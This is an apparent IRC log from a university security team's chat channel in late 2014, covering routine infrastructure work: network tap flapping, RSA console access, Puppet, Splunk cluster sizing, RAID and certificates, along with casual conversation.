2014-11-14 13:21:04	eyrich	do they use pfring? - maybe same thought applies
2014-11-14 13:22:03	jazoff	not sure if its this side or the gigamon side which is not happy
2014-11-14 13:22:48	eyrich	i dont think the gigamons would care - they will just process what ever they get -they might throw away l2 and L1+ traffic
2014-11-14 13:23:31	jazoff	yeah, it's odd, they are doing
2014-11-14 13:23:32	jazoff	2014-11-14T13:21:32.689737-06:00 nids-dev3 kernel: ixgbe 0000:41:00.0: p1p1: NIC Link is Up 10 Gbps, Flow Control: None
2014-11-14 13:23:33	jazoff	2014-11-14T13:21:47.836721-06:00 nids-dev3 kernel: ixgbe 0000:41:00.0: p1p1: detected SFP+: 3
2014-11-14 13:23:36	jazoff	2014-11-14T13:21:49.308725-06:00 nids-dev3 kernel: ixgbe 0000:41:00.0: p1p1: NIC Link is Up 10 Gbps, Flow Control: RX/TX
2014-11-14 13:23:39	jazoff	2014-11-14T13:21:59.885734-06:00 nids-dev3 kernel: ixgbe 0000:41:00.0: p1p1: detected SFP+: 3
2014-11-14 13:23:42	jazoff	2014-11-14T13:22:01.416734-06:00 nids-dev3 kernel: ixgbe 0000:41:00.0: p1p1: NIC Link is Up 10 Gbps, Flow Control: None
2014-11-14 13:23:45	jazoff	in a loop
2014-11-14 13:25:51	eyrich	do you have a way to exclude from the tap ports?
2014-11-14 13:26:05	jazoff	yeah.. for now I told it not to tx on p1p1 or p1p2
2014-11-14 13:26:17	jazoff	which will work for bro-dev, but not on the prod cluster since eth0 is the sniffer nic
2014-11-14 13:26:29	jazoff	possibly couldn't hurt to rename the capture ports to sniff1 and sniff2 like I used to do
2014-11-14 13:26:46	eyrich	thats what I was about to suggest, and then not tx on sniff ports
2014-11-14 13:26:50	jazoff	 I used to do that so eth0 was always the regular lan port
2014-11-14 13:27:02	eyrich	sounds like a good idea to me
2014-11-14 13:34:40	jazoff	good thing I tried this on the bro boxes first :)
2014-11-14 13:34:47	jazoff	would be a non-issue on any other
2014-11-14 13:41:54	jazoff	eyrich: do you see drought?
2014-11-14 14:12:23	wardog	he left...
2014-11-14 14:13:22	jazoff	ah, no biggie :)
2014-11-14 14:14:28	wardog	its very quiet today.
2014-11-14 14:32:11	jazoff	i noticed :)
2014-11-14 16:14:29	eyrich	eyrich@npcf-netsec> show lldp neighbors
2014-11-14 16:14:30	eyrich	Local Interface    Parent Interface    Chassis Id          Port info     System Name
2014-11-14 16:14:30	eyrich	xe-1/1/2.0         ae18.0              00:24:dc:88:4f:f0   xe-1/0/6.0   core-east
2014-11-14 16:14:30	eyrich	xe-0/1/2.0         ae17.0              00:26:88:88:5d:f0   xe-1/0/6.0   core-west
2014-11-14 16:14:30	eyrich	ge-0/0/20.0        -                   1c:c1:de:f4:e2:8c   Interface   2 as eth2 drought.ncsa.illinois.edu
2014-11-14 16:14:30	eyrich	ge-0/0/24.0        -                   1c:c1:de:f4:e2:8e   Interface   3 as eth3 drought.ncsa.illinois.edu
2014-11-14 16:14:30	eyrich	ge-3/0/46.0        ae2.0               5c:5e:ab:63:f6:80   ge-0/0/38.0  bw-mgmt
2014-11-14 16:14:33	eyrich	ge-4/0/46.0        ae2.0               5c:5e:ab:63:f6:80   ge-0/0/39.0  bw-mgmt
2014-11-14 16:14:36	eyrich	ge-0/0/39.0        -                   f0:1f:af:d8:e9:5a   Interface   2 as em1 nids-dev3.internal.ncsa.edu
2014-11-14 16:14:37	eyrich	ge-0/0/41.0        -                   f0:1f:af:d8:e9:6a   Interface   2 as em1 nids-dev1.internal.ncsa.edu
2014-11-14 16:14:40	eyrich	ge-0/0/38.0        -                   f0:1f:af:d9:01:3a   Interface   2 as em1 nids-dev4.internal.ncsa.edu
2014-11-14 16:14:41	eyrich	ge-0/0/42.0        -                   f0:1f:af:d9:02:ea   Interface   2 as em1 bro-dev.internal.ncsa.edu
2014-11-14 16:14:43	eyrich	ge-0/0/40.0        -                   f0:1f:af:d9:03:02   Interface   2 as em1 nids-dev2.internal.ncsa.edu
2014-11-14 16:21:48	jazoff	awesome
2014-11-17 01:52:54	soehlert	soo after spending most of the day waiting for planes that were delayed, 14 hours of travel later, I just got home with broken luggage thanks to the airlines. After that day, I need to catch up on some rest and get some things done. I'm going to take tomorrow off.
2014-11-17 01:52:57	soehlert	Err.. today
2014-11-17 13:10:56	jschipp	https://jira.ncsa.illinois.edu/browse/BWAM-2983, for new bwbh account. What does Brett mean by "They..need to be added to the account activity exemption list"
2014-11-17 13:12:45	jazoff	there's a whitelist for account inactivity or something right?
2014-11-17 13:14:07	eyrich	yes thats correct - keeps them from getting auto disabled
2014-11-17 13:14:38	jschipp	kk, thanks
2014-11-18 03:46:35	soehlert	must have eaten something bad. I've been spending the night vomiting so far. Not gonna be able to work tomorrow morning at the least.
2014-11-18 08:28:45	jazoff	soehlert: get lollypop yet?
2014-11-18 09:47:22	jazoff	interesting: https://www.eff.org/deeplinks/2014/11/certificate-authority-encrypt-entire-web
2014-11-18 18:52:04	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2014-11-19 08:49:47	eyrich	i got 5.0 L on my nexus 7 last night, havent played with it much. Not digging the new buttons (who the hell though it was a good idea to get rid of the home an dback buttons with circle square) WTF - is this a sony product
2014-11-19 08:56:08	jazoff	yeah, that was odd, but not really a problem
2014-11-19 08:56:21	jazoff	otherwise it's pretty awesome on the nexus 5
2014-11-19 09:02:35	wardog	How many phones does that make it in the last 3 months?
2014-11-19 09:05:12	jazoff	how many phones?
2014-11-19 09:14:52	wardog	yeah, that eyrich has bought in the last few months
2014-11-19 09:25:36	jazoff	oh, nexus7 is a tablet
2014-11-19 09:29:07	eyrich	3 i think, the S4, a HTC One M8 and now the OnePlus one, I only used the M8 for a week - did not like the OS. I really like CM11
2014-11-19 09:29:37	eyrich	Im giving the HTC One M8 to a family member and keeping the S4 as a spare
2014-11-19 09:33:41	wardog	Ug. Mmight have been a mistake to come into the office. May leave in a few to go home and lay down. Back is not quite up to snuff yet.
2014-11-19 09:34:10	wardog	Anyone here done accupuncture?
2014-11-19 09:55:52	soehlert	jazoff: ya I got lollipop on Monday. I don't mind the design changes, but it's screwed up all my Tasker stuff and I can't figure out why. It's also much worse on my battery life, but I think that may be related to the tasker something
2014-11-19 10:42:20	soehlert	oh and the adaptive brightness sucks in lollipop
2014-11-19 10:57:33	jazoff	oh.. I use twilight
2014-11-19 11:18:20	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-11-19 11:45:52	soehlert	i'll look into it. it worked fine before, but now it's ALWAYS dark unless i'm using my phone for about 5 minutes, then it brightens
2014-11-19 15:04:22	wardog	can someone enable port 443 to the world on grid-sec?
2014-11-19 15:07:57	jazoff	someone being eyrich ? :)
2014-11-19 15:14:18	jazoff	oh! you mean iptables and not pfsense?
2014-11-19 15:16:08	wardog	yes
2014-11-19 15:16:10	jazoff	looks like there is a mediawiki class already that is just not applied in prod
2014-11-19 15:18:33	jazoff	hmm, something is wrong with puppet on grid-sec
2014-11-19 15:18:46	jazoff	2014-11-19T15:18:11.851815-06:00 grid-sec puppet-agent[25246]: Could not retrieve catalog from remote server: getaddrinfo: Name or service not known
2014-11-19 15:25:39	jazoff	ah, restarting it a few times fixed it
2014-11-19 15:25:56	jazoff	looks like it was trying to use 10.142.148.1 for DNS
2014-11-19 15:26:58	jazoff	wardog: should be good now
2014-11-19 15:29:14	wardog	yep.
2014-11-19 15:29:26	wardog	Thanks!
2014-11-19 15:29:37	jazoff	you did not need port 80 right?
2014-11-20 12:11:07	eyrich	wardog: why do I care about my RSA password? when would I ever use it?
2014-11-20 12:17:38	soehlert	eyrich: you really do need to find a better way to send the public key for qualys. the formatting is terrible in email. granted admins should still know how to put it back together, but maybe a box link to a file or something
2014-11-20 12:18:56	eyrich	ok - probably not box though. I have a distaste for things like that. probably just tar it and attach
2014-11-20 12:19:55	soehlert	or that sure.
2014-11-20 12:20:13	eyrich	wardog: need my RSA password reset
2014-11-20 12:20:21	eyrich	matt told me to ask you
2014-11-20 12:21:44	soehlert	cant you do that in the self service portal?
2014-11-20 12:22:04	eyrich	not that I can tell - i am looking now.
2014-11-20 12:22:23	eyrich	only change password requires knosing old one
2014-11-20 12:22:36	eyrich	wtf was the point of the security questions?
2014-11-20 12:23:57	soehlert	ah i was wondering about that
2014-11-20 12:25:50	soehlert	jeeze..http://arstechnica.com/information-technology/2014/11/netflix-takes-up-9-5-of-upstream-traffic-on-the-north-american-internet/?comments=1
2014-11-20 12:31:47	wardog	eyrich: Your RSA password is for the management interface so you can disable OTP accounts.
2014-11-20 12:31:54	wardog	That's the only reason.
2014-11-20 12:34:53	eyrich	ok - please reset mine
2014-11-20 12:41:56	wardog	I'm currently fighting with the rsa interface.
2014-11-20 12:42:46	eyrich	ok
2014-11-20 12:43:05	eyrich	found on internet - referencing jurasic park -
2014-11-20 12:43:12	eyrich	To be fair to that scene, it actually takes a bit of awareness to realize that fucked up 3d UI was a filesystem wrapper.Like, "Oooooooooooooooh, there's/usr/, I get it now" was a perfectly reasonable reaction.
2014-11-20 12:43:17	eyrich	The 3D filesystem viewer was real and shipped with IRIX. There's a Linux port now - it was open sourced a few years back.--
2014-11-20 12:43:25	eyrich	and the punch line; Did it also include a 3D init system? Something tells me I'd prefer that to systemd...
2014-11-20 12:47:09	jschipp	more detail: https://movies.stackexchange.com/questions/9745/is-the-unix-operating-system-featured-in-jurassic-park-real
2014-11-20 12:48:10	wardog	I think that's the same OS that's on the Gibson
2014-11-20 12:49:28	wardog	https://www.youtube.com/watch?v=hTekDcdtVcg
2014-11-20 12:50:48	eyrich	hey thats Penn
2014-11-20 13:07:36	eyrich	is jazoff around?
2014-11-20 13:08:14	eyrich	hes missing the cites BHR call
2014-11-20 13:08:57	soehlert	hes been strangely quiet in here today..
2014-11-20 13:11:21	wardog	Guess there's a lot of people at SC.
2014-11-20 13:11:38	wardog	Sam want me to help you reset your RSA password?
2014-11-20 13:11:56	wardog	I updated docs on how to disable OTP accounts here: https://wiki.ncsa.illinois.edu/display/BWINTERNAL/CSTD+-+BW+Account+Suspension+Process
2014-11-20 13:12:06	wardog	screenshots and everything
2014-11-20 13:12:32	wardog	Unless you remember or have your password stored somehwere.
2014-11-20 13:13:03	soehlert	i have to do it? where is this coming from? i never heard anything until now
2014-11-20 13:14:01	soehlert	and where can i test it? i have a saved password for the self service console..
2014-11-20 13:14:26	wardog	You can test it here:
2014-11-20 13:14:37	wardog	https://rsaam1.ncsa.illinois.edu:7004/console-ims/
2014-11-20 13:14:55	wardog	It's only purpose is for you to log in and be able to disable an OTP user.
2014-11-20 13:18:11	soehlert	i just mean, why the sudden push?
2014-11-20 13:18:26	eyrich	i think it has to do with psp
2014-11-20 13:18:38	eyrich	iforge is testing rsa for some users
2014-11-20 13:18:40	soehlert	ya im good. 
2014-11-20 13:21:28	wardog	Oh. I think it's because I was going through the docs to make sure the disable procedures were up to date. I'm guessing Matt send out an email about resetting passwords when mine failed.
2014-11-20 13:23:03	soehlert	ahh i see. i never got an email which explains my confusion
2014-11-20 13:23:51	wardog	k
2014-11-20 13:24:08	wardog	Well, if anything I can confirm the documentation is up to date in case we need to disable any accounts.
2014-11-20 13:24:54	wardog	Right now only eyrich/soehlert/wardog are set up to disable accounts. 
2014-11-20 13:25:23	wardog	I should probably add jschipp  and jazoff 
2014-11-20 13:26:48	jschipp	I'm fine with not having anymore responsibilities 
2014-11-20 13:26:54	jschipp	;)
2014-11-20 13:27:10	eyrich	me too
2014-11-20 13:27:20	eyrich	oh crap too late :)
2014-11-20 13:27:32	jschipp	lol
2014-11-20 13:28:51	soehlert	agreed, though im pretty sure it's an all or nothing one based on what was agreed to
2014-11-20 13:29:15	wardog	It's not like a do every day duty.
2014-11-20 13:29:33	wardog	I don't think I've disabled a single OTP account since April of '13
2014-11-20 13:29:34	soehlert	im going to disable my own account 
2014-11-20 13:29:48	eyrich	hah
2014-11-20 13:31:45	jazoff	eyrich: my bad.. i had checked calendar this morning but it showed up as canceled and I was eating lunch
2014-11-20 13:31:54	jazoff	replying to the email now
2014-11-20 13:41:59	jazoff	eyrich: heh, I feel mostly the same way about 2d file browsers
2014-11-20 13:42:15	jazoff	"ohh, theres a list of my files with a picture next to each one, that makes so much more sense than just a list of names"
2014-11-20 13:42:42	soehlert	ditto
2014-11-20 13:43:25	jazoff	granted some of the problems with GUIs comes from using shitty names like /Documents and Settings/ instead of /home/ or /users/
2014-11-20 13:43:42	jazoff	it's often amusing watching someone trying to cd on windows :)
2014-11-20 13:45:32	soehlert	oh god ya. even documents would be a drastic improvement. people dont adjust settings in there anyway
2014-11-20 13:45:54	soehlert	or the fact that they have to use my * for everything
2014-11-20 13:47:26	jschipp	when my mom needs help organizing her family photos into different folders i'm grateful for 2d file browsers
2014-11-20 13:48:10	jazoff	photos are a little different since they are visual in the first place :)
2014-11-20 13:48:21	jschipp	should have said that ;) 
2014-11-20 14:28:05	wardog	jazoff: so, if I want to do searches against a local lookup table, do I put that file on the search head?
2014-11-20 14:29:54	wardog	is auth setup on splunks-sec set up with security AD yet?
2014-11-20 14:31:09	jazoff	no, not yet
2014-11-20 14:31:25	jazoff	and that's a good question.. I think it would need to be pushed out to the indexers
2014-11-20 14:32:23	jazoff	i've been wondering if all the extra work for the cluster is worth it :-/
2014-11-20 14:32:29	wardog	And is the admin pw for splunks-sec in lastpass?
2014-11-20 14:32:38	jazoff	no.. it's just mechanged
2014-11-20 14:32:45	wardog	oh
2014-11-20 14:33:51	jazoff	i dunno why splunk has to be so comlpicated
2014-11-20 14:34:15	jazoff	you'd think all config files could just be kept in sync on all machines automatically
2014-11-20 14:34:25	eyrich	jschipp: lightroom kicks butt for organizing photos.  You can get all of Adobe Creative Cloud for $5/year as a UofI employee. and install it on 2 home machines
2014-11-20 14:35:14	wardog	Then why not just make the cluster redundant instead of distributed?
2014-11-20 14:35:32	wardog	Since they're on hardware I'd feel more comfortable with redundancy.
2014-11-20 14:36:09	eyrich	wardog: did you request grid-sec.org in InCommon?
2014-11-20 14:36:15	wardog	eyrich: I did
2014-11-20 14:36:27	eyrich	ok so you are takign care of the DCV?
2014-11-20 14:36:28	wardog	And the DNS was configured for verification as well
2014-11-20 14:36:31	wardog	Adam is.
2014-11-20 14:36:51	jazoff	wardog: oh, that's the same config.. it's just an option set to 2 vs 1
2014-11-20 14:36:57	jazoff	they are both distributed
2014-11-20 14:38:08	wardog	splunki2-sec.internal.ncsa.edu can't seem to get to the licensing server
2014-11-20 14:39:35	wardog	The new interface is very different
2014-11-20 14:39:57	jazoff	yeah
2014-11-20 14:41:12	jazoff	i don't see anything wrong on splunki2 about licensing
2014-11-20 14:41:17	jazoff	Last successful contact time 29 seconds ago (11/20/14 2:40 PM) 
2014-11-20 14:41:24	wardog	hmmm. The message disappeared.
2014-11-20 14:42:37	jschipp	eyrich: thanks, will look into it
2014-11-20 14:44:15	soehlert	hey that was really cool of paul to send that email
2014-11-20 14:44:24	jschipp	I thought so too
2014-11-20 14:44:43	jschipp	he's a good dude
2014-11-20 14:44:44	jazoff	cool :)
2014-11-20 14:44:45	jschipp	lol
2014-11-20 14:44:50	wardog	sweet
2014-11-20 14:45:02	jazoff	i was always shocked at conferences when places admitted they didn't even have something like netflow
2014-11-20 15:13:49	wardog	jazoff: so, basically just change the replication factor?
2014-11-20 15:16:03	jazoff	yeah, though i dunno if you can do that after the fact.. at least there was a lot of warnings about that
2014-11-20 15:16:17	jazoff	worse case scenario i just wipe out the indexer boxes and start over
2014-11-20 15:18:00	jschipp	Easily comment lines are blocks of code with vim motions:
2014-11-20 15:18:01	jschipp	github.com/tpope/vim-comm #vim
2014-11-20 15:18:04	jschipp	err
2014-11-20 15:18:26	jschipp	or* https://github.com/tpope/vim-commentary
2014-11-20 15:18:55	wardog	jazoff: I'm ok with just wiping and resetting.
2014-11-20 15:21:22	jazoff	is there much point in doing replication at that point?
2014-11-20 15:21:30	jazoff	everthing in splunk should be archived elsewhere anyway
2014-11-20 15:21:42	jazoff	maybe the best thing is just stick with a single beefy box
2014-11-20 15:22:02	jazoff	I somewhat understand how the cluster works and that is after reading docs for hours
2014-11-20 15:22:50	jazoff	seems like it might be too much work to maintain for just 2 indexers
2014-11-20 15:23:50	soehlert	i swear to god jazoff...
2014-11-20 15:24:15	jazoff	hah
2014-11-20 15:25:19	jazoff	I mean, i'm ok with proceeding, but it is very complicated, and just when I think I have things down, I find more gotchas in the documentation
2014-11-20 15:29:19	soehlert	i was just playing, i don't really care. if you think the pain is not worth the benefits of cluster vs single box, then we go that route
2014-11-20 15:29:34	soehlert	as long as we don't lose any requirements, which i doubt
2014-11-20 15:29:54	jazoff	yeah.. just seems after reading all the docs and getting things working it is really not designed for 2 boxes
2014-11-20 15:30:09	jazoff	and then stuff like what warren wants to do is a PITA
2014-11-20 15:30:18	soehlert	what does he wanna do?
2014-11-20 15:30:20	jazoff	you can't just upload a .csv file and have it work, it needs to be distributed across the indexers
2014-11-20 15:30:59	jazoff	which is fine if you had 20, but otherwise you need to go on the master node, add it to master-apps, then deploy the bundle to the indexers
2014-11-20 15:31:19	jazoff	which for 2 machines is more work than just adding it to both boxes
2014-11-20 15:32:54	soehlert	ahh i see. especially with puppet id imagine
2014-11-20 15:33:06	soehlert	maybe wardog should just stop being unrealistic :)
2014-11-20 15:33:43	jschipp	well I'm glad I'm not the only one struggling, cif can go to hell too
2014-11-20 15:33:45	jazoff	i kinda blame splunk for some of this :)
2014-11-20 15:34:19	jazoff	what's up with cif?
2014-11-20 15:34:41	jschipp	its design
2014-11-20 15:34:53	jazoff	hah
2014-11-20 15:34:54	jschipp	30+ perl modules
2014-11-20 15:35:01	jschipp	lol :) I'm trying to puppetize it
2014-11-20 15:35:07	jazoff	are you using system perl or perlbrew?
2014-11-20 15:35:43	soehlert	you can use ssh pubkeys in puppet for user definitions right?
2014-11-20 15:35:45	jschipp	I added a puppet module for perl but I haven't that for yet
2014-11-20 15:35:56	jschipp	got that*
2014-11-20 15:36:15	jazoff	soehlert: yeah, puppet has a ssh_authorized_key
2014-11-20 15:36:23	jazoff	see modules/bro/manifests/init.pp
2014-11-20 15:36:36	jazoff	is this for the qualys thing? you can also make keys more secure by locking it to an ip
2014-11-20 15:36:58	jazoff	not sure if puppet supports that though
2014-11-20 15:37:27	jazoff	ah, it has an options field
2014-11-20 15:37:53	jazoff	so in theory,  options => 'from="141.142.x.y"' should work
2014-11-20 15:38:45	soehlert	ahh cool i'll give that a try. thanks
2014-11-20 15:39:22	soehlert	jazoff: friendly remind..  #FIXME: make this more granular?
2014-11-20 15:39:26	soehlert	reminder..
2014-11-20 15:39:30	wardog	My concern with splunk is that since the indexer is on a physical box, I would want redundancy in case it dies.
2014-11-20 15:40:14	jazoff	soehlert: oh, it's probably ok, but couldn't hurt to look into that
2014-11-20 15:40:24	wardog	Are you saying it's easier with 20 indexers? or is it the same PITA?
2014-11-20 15:41:01	jazoff	it's the same pita
2014-11-20 15:41:07	jazoff	just for 20, it would be worth it
2014-11-20 15:41:09	soehlert	i think it makes more sense to go through pain for 20
2014-11-20 15:41:14	soehlert	not for 2
2014-11-20 15:41:17	jazoff	it's like setting up something like kerberos or puppet for 2 machines
2014-11-20 15:41:20	wardog	Yep
2014-11-20 15:44:01	wardog	I guess there's also the pain of distribution of forwarders, right?
2014-11-20 15:44:30	jazoff	yeah, though at least right now we only run one
2014-11-20 15:45:24	wardog	Alright. well, let's move forward then with just 1 indexer. We do have all that data in other locations should it go down.
2014-11-20 15:45:38	jazoff	so, no more cluster then?
2014-11-20 15:45:55	wardog	If you don't see the need for a cluster, I trust you.
2014-11-20 15:46:22	soehlert	Listen all of y'all it's a sabotage
2014-11-20 15:46:26	jazoff	i'm just concerned about maintenence moving forward.. at least with one box everyone knows how it works
2014-11-20 15:46:42	wardog	you can stop selling it. Just do it.
2014-11-20 15:46:48	jazoff	ok :)
2014-11-20 15:46:54	wardog	:D
2014-11-20 15:46:58	soehlert	ya what are you waiting for (it might be a little until i can get there)
2014-11-20 15:47:09	jazoff	oh, I dunno if you need to go there
2014-11-20 15:47:39	wardog	http://open.spotify.com/track/0Puj4YlTm6xNzDDADXHMI9
2014-11-20 15:47:42	soehlert	those are hardware arent they?
2014-11-20 15:47:44	jazoff	i think we just need to: remove splunkmaster, splunk-sec, and spunki2, then rename splunki1 to splunk-sec and reinstall splunk on it as a all in one
2014-11-20 15:48:06	soehlert	wardog: glad someone caught that
2014-11-20 15:48:22	soehlert	well feel free to shutdown everything you dont need and rename 
2014-11-20 15:48:28	soehlert	and reinstall. hell just do it all :)
2014-11-20 15:48:29	jazoff	though I suppose if we could move the disks from splunki2 into splunki1 and have a bigger array that could be nice
2014-11-20 15:48:37	soehlert	they are vms
2014-11-20 15:48:42	soehlert	right? no wait
2014-11-20 15:48:54	jazoff	master and splunk-sec are vms, the indexers are physical
2014-11-20 15:49:14	soehlert	right. i can add a couple HDDs into splunki-1 sometime soon. does it need to be before you do all this?
2014-11-20 15:49:36	jazoff	i don't actually know.. what kind of raid is it using?
2014-11-20 15:54:12	jazoff	raid 10 is probably best for splunk if we have enough disks
2014-11-20 15:56:24	soehlert	i'll see what i can do. probably won't be until at least next week, which means maybe not till dec
2014-11-20 15:56:40	soehlert	wardog: not for actual thanksgiving, but the friends thanksgiving is always a turducken
2014-11-20 15:56:47	jazoff	that's fine.. i'll be in town and we can work on it together
2014-11-20 15:56:53	wardog	If you want to keep splunks-sec.internal.ncsa.edu that would be one less issued certificate that we'd have to revoke.
2014-11-20 15:57:02	jazoff	sure
2014-11-20 15:57:08	wardog	soehlert: I want a turducken.
2014-11-20 15:57:24	wardog	Actually certs are cheap (free) so whatever you guys want to do is fine.
2014-11-20 15:58:00	jazoff	splunks-sec is fine, just need to remember it's not splunk-sec
2014-11-20 15:58:31	jazoff	intersting.. this popped up as a sponsored post in twitter
2014-11-20 15:58:33	jazoff	https://www.atlantic.net/vps/vps-hosting/?utm_content=buffer945a2&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer
2014-11-20 15:58:45	jazoff	.99c/mo VPS
2014-11-20 15:59:37	jazoff	probably some fun things that could be done with a few of those
2014-11-20 16:03:46	wardog	Data Transfer Out: $0.02/GB (All plans include a minimum 1,000GB / 1TB free transfer)
2014-11-20 16:05:11	wardog	no GO for CentOS. Although, GO for Ubuntu...
2014-11-20 16:05:57	jazoff	i can't think of what i'd use it for though :)
2014-11-20 16:06:05	jazoff	I already have a VPS and 2 raspberry pis at home 
2014-11-20 16:06:20	wardog	where's your vps?
2014-11-20 16:06:26	jazoff	digital ocean
2014-11-20 16:06:52	jazoff	was on amazon for a while until the free credit ran out, then I signed up with DO about a year ago on their black friday sale
2014-11-20 16:07:11	jazoff	which was like $50 credit for a new account, so I basically got a year for $10
2014-11-20 17:01:21	jschipp	Turturkeykey
2014-11-20 20:40:47	wardog	turduchickenckkey
2014-11-21 08:59:19	jazoff	well that udp dos policy turned out to be useful
2014-11-21 08:59:29	eyrich	very
2014-11-21 09:00:07	eyrich	thats the same machine from Sunday. just new name. They told me they iptables and ntp conf restricted it to the subnet the open stack system is one
2014-11-21 09:00:14	eyrich	i guess they started over or did it wrong
2014-11-21 09:00:40	jazoff	clearly :)
2014-11-21 09:27:08	soehlert	jazoff: do you want me to stop at npcf and shove some more hard drive in one of the indexers?
2014-11-21 09:28:35	jazoff	sure
2014-11-21 09:28:53	jazoff	do you know what kind of raid they are doing?
2014-11-21 09:29:30	soehlert	i havent checked yet
2014-11-21 09:31:39	jazoff	ah. for something like splunk raid10 would be best i think
2014-11-21 09:33:27	soehlert	i dont think its using raid at all unless im checking incorrectly
2014-11-21 09:34:29	jazoff	ah, good thing I asked :)
2014-11-21 09:37:01	soehlert	never tried before, but i would imagine i cant change that after the fact? so a reinstall would be necessary?
2014-11-21 09:37:20	jazoff	possibly. no objections here if that's what you need to do
2014-11-21 09:38:26	soehlert	hmm lemme read a little. if it's going to come to that, you'll have to wait a bit. 
2014-11-21 09:38:32	jazoff	ok
2014-11-21 09:41:17	wardog	How many drive bays do those HPs have?
2014-11-21 09:41:57	wardog	Do we have any available chassis that have more than 4?
2014-11-21 09:42:12	jazoff	don't they have like 8?
2014-11-21 09:42:23	wardog	I thought the HPs only had 4.
2014-11-21 09:42:48	jazoff	hmm, i think you're right.. they are the smaller disks but I don't think there is much front panel room allocated to them
2014-11-21 09:43:18	wardog	I don't recall if they're 2.5 or 3.5 drive bays.
2014-11-21 09:43:58	wardog	Oh.
2014-11-21 09:44:00	wardog	I think you're right
2014-11-21 09:44:04	wardog	http://h20566.www2.hp.com/portal/site/hpsc/public/psi/home/?sp4ts.oid=4091408&sp4ts.pn=579237-B21&sp4ts.sn=USE105N5ZS&ac.admitted=1416584632302.876444892.199480143
2014-11-21 09:44:07	soehlert	only 4
2014-11-21 09:44:45	soehlert	well hell i guess im wrong
2014-11-21 09:47:01	wardog	is there a way to pull the system's serial from cli?
2014-11-21 09:47:06	jazoff	yeah..
2014-11-21 09:47:28	jazoff	USE105N5ZM
2014-11-21 09:47:41	wardog	what did you use?
2014-11-21 09:47:42	jazoff	facter from puppet figures it out
2014-11-21 09:47:49	jazoff	you should be able to view it on the puppet-sec gui too
2014-11-21 09:47:57	wardog	ah
2014-11-21 09:48:08	wardog	Well. warranty on that one is expired.
2014-11-21 09:48:17	wardog	Ended in February
2014-11-21 09:49:54	soehlert	they all ran out no?
2014-11-21 09:50:08	wardog	I thought we had a little longer.
2014-11-21 09:50:21	wardog	What's the puppet server hostname again?
2014-11-21 09:50:35	eyrich	im not sure the warranties are out - i think HP's sites suck. I have gotten inconsistent results and ended up having to ask the sales man
2014-11-21 09:50:43	jazoff	puppet-sec
2014-11-21 09:50:44	wardog	found it
2014-11-21 10:10:57	wardog	Do you guys want a cert for puppet-sec?
2014-11-21 10:12:11	jazoff	well we have puppets-sec
2014-11-21 10:12:20	jazoff	not sure what the extra s is for though
2014-11-21 10:12:40	wardog	ah. dmidecode -s system-serial-number
2014-11-21 10:12:58	wardog	You mean you already have a cert for puppets-sec?
2014-11-21 10:13:49	jazoff	oh, I thought we did
2014-11-21 10:13:54	wardog	we have splunks-sec
2014-11-21 10:13:59	jazoff	oh, der
2014-11-21 10:14:02	wardog	:D
2014-11-21 10:14:13	wardog	I'll gen one for puppet-sec then
2014-11-21 10:14:28	jazoff	soehlert set that up, I guess we are using a self signed?
2014-11-21 10:14:31	jazoff	i must have whitelitsed it a while ago
2014-11-21 10:17:15	wardog	CN=Puppet CA generated on puppet-sec.ncsa.illinois.edu
2014-11-21 10:17:57	jazoff	oh, actually
2014-11-21 10:18:03	jazoff	replacing that cert might not be straightforward
2014-11-21 10:18:18	wardog	So if it's Puppet created, is puppet running the web server?
2014-11-21 10:18:20	wardog	right.
2014-11-21 10:18:30	jazoff	yeah, and puppet uses certs extensively
2014-11-21 10:19:03	wardog	ug
2014-11-21 10:22:00	wardog	well... We'll just leave that alone for now then
2014-11-21 10:42:45	soehlert	wait, what's puppets-sec?
2014-11-21 10:42:57	jazoff	nothing.. me being dumb
2014-11-21 10:43:19	soehlert	ah ok. and ya i didnt do any cert stuff puppet does its own convoluted set up of those
2014-11-21 10:43:58	jazoff	i'm sure there is a way to use a real cert, but possibly not after you push out the ca cert to all the nodes
2014-11-21 10:44:09	jazoff	and i doubt it is easy :)
2014-11-21 10:44:10	wardog	I was hoping that at least the web console used a different set of certificates. I'm not sure if that's easily unmarried.
2014-11-21 10:44:38	jazoff	i don't think so.. I think the web console is the same endpoint that some of the stuff hits for the api
2014-11-21 10:44:47	wardog	does splunk have an ldap lookup method?
2014-11-21 10:44:47	jazoff	at least the hiera stuff
2014-11-21 12:05:51	jschipp	how cor
2014-11-21 12:06:10	jschipp	er
2014-11-21 12:13:22	jschipp	sagan.io log analysis engine using snort rule syntax, we should deploy this, easier than SEC (dear god) and OSSEC rules. I can write snort rules all day
2014-11-21 12:14:12	jazoff	someone at UA loved sec
2014-11-21 12:14:14	jazoff	he was a perl person
2014-11-21 12:14:24	jazoff	i saw one of the configs once.. scarriest thing ever
2014-11-21 12:15:32	jschipp	indeed, and we don't maintain it partly because it's too much work and we don't know how lol
2014-11-21 12:30:31	jschipp	there neeeds to be a yum repo for modules on cpan, i have 21 module to install that are not in epel or the  default 
2014-11-21 12:30:59	jazoff	there was a tool in debian that would build debs for perl modules.. maybe ther is one for redhat
2014-11-21 12:31:01	jazoff	or maybe fpm can do it
2014-11-21 12:31:14	jazoff	https://github.com/jordansissel/fpm/wiki/Perl-Packaging-With-FPM
2014-11-21 12:31:37	jazoff	or look at perlbrew and just install things in /opt
2014-11-21 12:34:00	jschipp	perlbrew doesn't seem to install modules but creating separate perl environments
2014-11-21 12:45:44	jazoff	correct
2014-11-21 12:45:59	jazoff	you create an environment and then you install whatever you want in it, leaving the system perl alone
2014-11-21 13:14:40	soehlert	ya fpm does perl and hey i know HOW to play with SEC, I just hate it and I ddon't know how to make it not send emails as me
2014-11-21 13:32:42	jschipp	 sure,  Iknow how to play with SEC  too but actually understanding all the scripts in our deployment is a differentt matter
2014-11-21 13:33:15	soehlert	meh they are decipherable, but nobody wants that job
2014-11-21 13:33:16	jschipp	i'd be surpsired if anyone of has read them all all
2014-11-21 13:33:33	soehlert	i did when i first started here, as did raphael as he was rewriting them
2014-11-21 13:34:32	jschipp	do you remember what they all do? author doesn't count but I doubt even he remembers lol
2014-11-21 13:35:55	jschipp	I'm just trying to make a point that it's a mess
2014-11-21 13:37:07	jschipp	I think we could replace it with something more maintainable and easier to use, anything where you have to write custom perl code to do analysis is not very maintainable in the long term
